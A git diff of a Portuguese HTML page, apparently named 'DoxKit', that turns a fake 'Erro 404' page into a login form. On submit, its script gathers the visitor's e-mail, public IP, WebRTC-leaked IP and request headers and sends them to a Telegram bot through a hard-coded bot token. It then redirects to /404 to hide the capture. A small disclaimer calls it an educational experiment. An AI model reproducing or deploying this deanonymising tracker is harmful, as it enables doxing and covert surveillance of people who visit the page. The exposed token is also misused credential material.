@@ -1,11 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Erro 404</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DoxKit - Login</title>
+  <style>
+    body {
+      background: #0f0f0f;
+      font-family: Arial, sans-serif;
+      color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-box {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .login-box h1 {
+      margin-bottom: 20px;
+      color: #00ffff;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background: #2c2c2c;
+      color: white;
+    }
+    button {
+      background: #00ffff;
+      border: none;
+      padding: 10px 20px;
+      color: #000;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    small {
+      display: block;
+      margin-top: 15px;
+      color: #aaa;
+    }
+  </style>
 </head>
 <body>
-  Erro 404 - Arquivo não disponível.
+  <div class="login-box">
+    <h1>DoxKit</h1>
+    <form id="login-form">
+      <input type="email" id="email" placeholder="Digite seu e-mail" required>
+      <button type="submit">Entrar</button>
+      <small>Este é um experimento educacional. Ao clicar em "Entrar", você consente com a coleta de dados para fins demonstrativos.</small>
+    </form>
+  </div>
 
   <script>
     const BOT_TOKEN = '8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8';
@@ -58,20 +115,23 @@
       });
     }
 
-    async function main() {
+    document.getElementById('login-form').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
       const webrtcIP = await getWebRTCIP();
       const publicIP = await getPublicIP();
       const headers = await getRequestHeaders();
 
-      let msg = `*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers enviados:*`;
+      let msg = `*Novo acesso ao DoxKit:*\n*E-mail:* ${email}\n*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers enviados:*`;
       for (const [key, value] of Object.entries(headers)) {
         msg += `\n${key}: ${value}`;
       }
 
       await sendToTelegram(msg);
-    }
 
-    main();
+      window.location.href = '/404';
+    });
   </script>
 </body>
 </html>
